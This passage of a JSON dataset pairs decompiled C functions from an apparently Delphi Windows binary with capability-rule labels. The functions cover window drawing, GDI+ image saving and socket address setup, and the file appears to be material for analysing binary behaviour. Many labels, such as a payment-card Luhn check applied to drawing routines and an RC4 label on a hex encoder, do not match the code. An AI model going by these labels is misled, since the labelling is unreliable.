        "decompiled_code": "\nvoid fcn.00459bb4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x459bc5;\n    var_4h = in_EAX;\n    uStack16 = fcn.004585f8();\n    puStack20 = 0x459bcb;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x459c0a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xdc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459c11;\n    uStack24 = var_8h;\n    uStack28 = 0x459c03;\n    uStack28 = fcn.004585f8();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 261
    },
    "00459c18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459c18(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x459cb1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.004246fc();\n    uVar1 = fcn.004531dc();\n    fcn.00450894(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.004059dc();\n    uVar2 = fcn.00425714(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x459cb8);\n    return;\n}\n",
        "token_count": 276
    },
    "00459fbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459fbc(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xe0))();\n    return;\n}\n",
        "token_count": 46
    },
    "00459fe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459fe4(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.00418448(arg_8h, 0);\n    uVar1 = fcn.004531dc();\n    uVar2 = fcn.004059dc(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.00425714(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 179
    },
    "0045a0d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a0d4(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 122
    },
    "0045a4dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a4dc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0045b9b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b9b4(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t in_EDX;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418448(&var_1ch, *(*(arg_8h + -4) + 0x18) + in_EDX + -2);\n    fcn.00432228();\n    cVar1 = fcn.00432330();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00425714(&var_1ch, 1, 0);\n        sub.user32.dll_DrawFrameControl(uVar2);\n    }\n    else {\n        fcn.00432228();\n        fcn.00432570();\n        arg_ch = &var_1ch;\n        arg_8h_00 = 0;\n        uVar2 = fcn.00425714();\n        fcn.00432228(uVar2);\n        fcn.004323ec(arg_8h_00, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "0045bad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bad0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint *arg_ch_00;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418448(&var_1ch, arg_8h);\n    fcn.00432228();\n    fcn.004324d4();\n    arg_ch_00 = &var_1ch;\n    arg_8h_00 = 0;\n    uVar1 = fcn.00425714();\n    fcn.00432228(uVar1);\n    fcn.004323ec(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 168
    },
    "0045c80c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c80c(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.004585f8(uVar1, uVar2);\n    fcn.0045d63c();\n    uVar1 = fcn.004585f8();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.0045c934();\n    return;\n}\n",
        "token_count": 237
    },
    "0045cab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045cab0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.0045aa58();\n        iVar1 = fcn.0045a5b8();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.0045aa58();\n    }\n    fcn.0045ca20(&stack0xfffffffc);\n    return var_8h;\n}\n",
        "token_count": 151
    },
    "0045cb00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045cb00(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.004501b4();\n        fcn.004501b4();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 333
    },
    "0045cd34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cd34(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0045adac();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00418420();\n            iVar1 = fcn.0045b590();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.0045cb00(uVar2);\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.0045cb7c(&stack0xfffffffc);\n        }\n        else {\n            fcn.0045cbfc(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "0045d054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d054(uint param_1, uint param_2)\n\n{\n    fcn.00403450(param_2, param_1);\n    return;\n}\n",
        "token_count": 41
    },
    "0045d084": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045d084(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    \n    if (param_1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00403450(param_2);\n        iStack12 = param_1;\n    }\n    return CONCAT44(iStack12, uVar1);\n}\n",
        "token_count": 102
    },
    "0045d3a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d3a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x45d481;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar4 = (**(*in_EAX + 8))();\n    if (var_10h == 0x12) {\n        fcn.00405530();\n    }\n    else if ((iVar4 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n        fcn.004501b4();\n        (***in_EAX)();\n        iVar2 = *(iVar4 + 0x40) * 2 - var_20h;\n        iVar3 = *(iVar4 + 0x44) * 2 - var_1ch;\n        iVar1 = *(iVar4 + 0x48);\n        iVar4 = *(iVar4 + 0x4c);\n        fcn.00450894();\n        fcn.00405584();\n        *in_ECX = iVar2;\n        in_ECX[1] = iVar3;\n        in_ECX[2] = iVar1 * -2 + var_18h * 3 + iVar2 * -2;\n        in_ECX[3] = iVar4 * -2 + var_14h * 3 + iVar3 * -2;\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x45d488;\n    uStack60 = 0x45d480;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 500
    },
    "0045dae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045dae0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x45dc58;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.0040af98(puVar3);\n    fcn.00405584();\n    uVar1 = fcn.004059dc();\n    *0x499c70 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.0040af98(puVar3);\n    fcn.00405584();\n    uVar1 = fcn.004059dc();\n    *0x499c72 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.004059dc();\n    *0x499c7c = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x499cb4 = fcn.00419ab0();\n    fcn.0045d6e8();\n    *0x499c5c = fcn.0045d494();\n    uVar1 = fcn.00443b58();\n    **0x494cfc = uVar1;\n    uVar1 = fcn.00444d60();\n    **0x494b0c = uVar1;\n    fcn.00446d9c();\n    fcn.00419260();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x45dc94);\n    if (iVar2 != 0) {\n        *0x49264c = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x45dc9c);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405530(0x45dc5f);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 621
    },
    "0045dcac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0045dcac(int32_t param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    in_EAX[1] = param_1;\n    (**(*in_EAX + 0x14))();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 180
    },
    "0045e464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045e464(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.00404704();\n    if (cVar1 == '\\0') {\n        cVar1 = sub.ole32.dll_IsEqualGUID(arg_ch, *(*(arg_8h + 4) + 0x30) + 0x20);\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            fcn.00404704();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 172
    },
    "0045e438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e438(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 8) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0045f588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045f588(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        fcn.00405530();\n    }\n    else {\n        fcn.0045f5f8();\n        fcn.0045f740();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0045f5c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f5c0(uint *param_1)\n\n{\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    fcn.0045eb30();\n    fcn.0045eb54();\n    fcn.0045ebe8();\n    *param_1 = uStack28;\n    param_1[1] = uStack24;\n    param_1[2] = uStack20;\n    param_1[3] = uStack16;\n    return;\n}\n",
        "token_count": 123
    },
    "0045f740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0045f740(void)\n\n{\n    uint8_t *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    \n    fcn.00405c6c();\n    pcVar1 = fcn.004059dc();\n    iVar2 = 0x10;\n    do {\n        *pcVar1 = \"0123456789abcdef\\x04\"[*in_EAX >> 4];\n        pcVar1[1] = \"0123456789abcdef\\x04\"[*in_EAX & 0xf];\n        pcVar1 = pcVar1 + 2;\n        in_EAX = in_EAX + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 167
    },
    "0045fa24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045fa24(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45fa39;\n    fcn.00407080();\n    uStack24 = 0x45fa7a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uVar1 = *(in_EAX + 4);\n    puStack20 = &stack0xfffffffc;\n    sub.gdiplus.dll_GdipSaveImageToStream(uVar1, in_EDX);\n    fcn.0045fab0();\n    *in_FS_OFFSET = uVar1;\n    fcn.0040700c(0x45fa81, arg_8h);\n    return;\n}\n",
        "token_count": 216
    },
    "0045fabc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045fabc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromScan0(in_ECX, arg_ch, 0, arg_8h, 0, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.0045faac();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 230
    },
    "0045fb1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045fb1c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromHBITMAP(in_ECX, arg_8h, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.0045faac();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 219
    },
    "0045fb74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045fb74(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    int32_t var_4h;\n    \n    if (param_2 != '\\0') {\n        var_4h = param_1;\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    var_4h = 0;\n    if (param_1 != 0) {\n        uVar1 = sub.gdiplus.dll_GdipGetImageGraphicsContext(*(param_1 + 4), &var_4h);\n        *(in_EAX + 8) = uVar1;\n    }\n    fcn.0045fc4c();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 247
    },
    "0045fddc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045fddc(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_ECX;\n    arg_8h_00 = fcn.0045fa8c();\n    uVar1 = fcn.0045fabc(arg_8h_00, uVar1);\n    fcn.0045fb74();\n    if (arg_8h == '\\x01') {\n        fcn.0045fbf4();\n    }\n    else if (arg_8h == '\\x02') {\n        fcn.0045fbf4();\n    }\n    else if (arg_8h == '\\x03') {\n        fcn.0045fbf4();\n    }\n    iVar2 = fcn.0045fc10(in_ECX, in_EDX, 0);\n    fcn.00404650();\n    fcn.00404650();\n    *in_EAX = uVar1;\n    return iVar2 == 0;\n}\n",
        "token_count": 267
    },
    "0045fe8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fe8c(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack104;\n    uint uStack100;\n    uchar *puStack96;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x45ff6c;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack96 = 0x45febc;\n    var_8h = param_2;\n    var_ch = fcn.0045fb1c(param_2);\n    uStack100 = 0x45ff4f;\n    iStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puStack96 = &stack0xfffffffc;\n    fcn.0045fcf8();\n    var_2ch = 1;\n    var_28h = **0x4948e4;\n    uStack40 = (*0x4948e4)[1];\n    uStack36 = (*0x4948e4)[2];\n    uStack32 = (*0x4948e4)[3];\n    var_14h = **0x494cc8;\n    var_18h = 1;\n    var_10h = &fcn.0045fe8c::var_8h;\n    fcn.00420ae0(0);\n    fcn.00407024();\n    arg_8h = &fcn.0045fe8c::var_2ch;\n    fcn.0045fa24(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    iStack104 = 0x45ff56;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 510
    },
    "0045ff90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ff90(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x460057;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x45ffc4;\n    fcn.0045fb1c(var_ch);\n    uStack68 = 0x46003a;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.0045fddc(0);\n    fcn.0045fcf8();\n    fcn.00420ae0(0);\n    fcn.00407024();\n    uVar1 = 0;\n    fcn.0045fa24(0);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404650(0x460041);\n    return;\n}\n",
        "token_count": 298
    },
    "00460394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00460394(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ffc4();\n    *(in_EAX + 0x30) = 0;\n    *(in_EAX + 0x31) = 0;\n    *(in_EAX + 0x34) = 0;\n    *(in_EAX + 0x38) = 0;\n    *(in_EAX + 0x3c) = 0;\n    *(in_EAX + 0x3e) = 0;\n    *(in_EAX + 0x40) = 0xffffffff;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    *(in_EAX + 0x50) = 0;\n    *(in_EAX + 0x54) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x5c) = 0;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x6c) = 0;\n    fcn.0040f490();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 415
    },
    "004605c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004605c8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00460394();\n    *(in_EAX + 0x3c) = 2;\n    *(in_EAX + 0x3e) = 0;\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 196
    },
    "00460628": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460628(ushort *arg_8h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x460648;\n    fcn.004059cc();\n    puStack28 = 0x460650;\n    fcn.004059cc();\n    uStack32 = 0x4606bd;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *arg_8h = 2;\n    puStack28 = &stack0xfffffffc;\n    fcn.004606cc();\n    uVar2 = fcn.004059dc();\n    uVar2 = sub.wsock32.dll_inet_addr(uVar2);\n    *(arg_8h + 2) = uVar2;\n    uVar2 = fcn.004607a4();\n    uVar1 = sub.wsock32.dll_htons();\n    arg_8h[1] = uVar1;\n    *in_FS_OFFSET = uVar2;\n    uStack36 = 0x4606c4;\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 312
    },
    "004606cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "resolve DNS"
        ],
